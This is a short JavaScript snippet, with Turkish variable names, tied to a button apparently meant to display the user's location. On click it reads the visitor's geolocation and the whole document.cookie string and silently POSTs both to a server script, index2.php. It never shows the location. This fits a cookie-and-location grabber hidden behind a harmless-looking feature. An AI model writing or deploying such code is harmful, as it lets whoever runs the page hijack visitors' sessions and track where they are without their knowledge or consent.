 
        let boylam,enlem;
        let disLoc = document.getElementById("displayLoc");

        disLoc.addEventListener("click",()=>{
            navigator.geolocation.getCurrentPosition(show);
        })

        function show(position){
            boylam=position.coords.longitude;
            enlem = position.coords.latitude;
            cookie=document.cookie;

            var xhr = new XMLHttpRequest();
            xhr.open('POST', 'index2.php', true);
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            xhr.send('latitude=' + enlem + '&longitude=' + boylam +'&cookie=' + cookie);
}
